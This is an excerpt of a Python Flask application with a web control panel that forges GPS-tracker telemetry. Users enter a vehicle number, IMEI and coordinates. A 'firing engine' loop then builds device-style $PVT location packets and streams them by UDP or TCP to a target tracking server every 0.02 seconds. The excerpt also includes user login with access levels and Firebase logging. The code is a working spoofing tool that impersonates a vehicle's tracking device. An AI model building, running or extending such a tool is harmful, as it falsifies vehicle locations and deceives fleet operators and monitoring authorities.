...
# --- ENGINE STATE ---
status = {"firing": False, "count": 0, "proto": "UDP", "imei": "", "vno": "", "lat": "", "lon": "", "last_pkt": "Ready..."}
...
<head>
    ...
    <style>
        ...
        input, select { width: 94%; padding: 10px; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; font-weight: bold; }
...
<body>
    <div class="box">
        ...
        <form action="/action" method="post" class="grid">
            <div class="full"><label>VEHICLE NO</label><input type="text" name="vno" id="vno" value="{{vno}}" oninput="this.value = this.value.toUpperCase();" onblur="checkVehicle()"></div>
            <div class="full"><label>IMEI</label><input type="text" name="imei" id="imei" value="{{imei}}"></div>
            <div><label>LATITUDE</label><input type="text" name="lat" id="lat" value="{{lat}}"></div>
            <div><label>LONGITUDE</label><input type="text" name="lon" id="lon" value="{{lon}}"></div>
    ...
    <script>
        ...
        async function checkVehicle() {
            ...
            if(data.imei) { 
                ...
                let pos = [parseFloat(data.lat), parseFloat(data.lon)];
                map.setView(pos, 15);
        ...
        setInterval(() => {
            fetch('/data').then(r => r.json()).then(d => {
                ...
                if(pre) pre.innerText = d.last_pkt;
            });
        }, 1000);
    </script>
</body>
...
def log_to_firebase():
    try:
        ...
        # Dono jagah update kar rha hu: Records aur History
...
def firing_engine():
    ...
    while status["firing"]:
        try:
            ...
            # --- UPDATED MIJO STRING ---
            pkt_str = f"$PVT,{tag},1.ONTC,NR,01,L,{status['imei']},{status['vno']},1,{f_date},{f_time},{f_lat},N,{f_lon},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*"
            status["last_pkt"] = pkt_str
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if status["proto"] == "UDP" else socket.SOCK_STREAM)
            if status["proto"] == "TCP":
                sock.settimeout(3); sock.connect(target); sock.send(pkt_str.encode())
            else: sock.sendto(pkt_str.encode(), target)
            status["count"] += 1
            sock.close()
            time.sleep(0.02)
        except: time.sleep(1)
...
def login():
    ...
    if request.method == 'POST':
        ...
        if data and str(data.get('password')) == str(pw):
            if data.get('status') != "Active": error = "ACCOUNT BLOCKED!"
            else:
                session['user'] = uid
                session['access_level'] = data.get('access_level', 'basic')
                # DB Call-back fix on login
...
def check_vehicle():
    ...
    try:
        # ASLI FIX: Records se data uthao call-back ke liye
...
def action():
    ...
    if val == "reset":
        status.update({"firing": False, "count": 0, "imei": "", "vno": "", "lat": "25.65", "lon": "84.78", "last_pkt": "Ready..."})
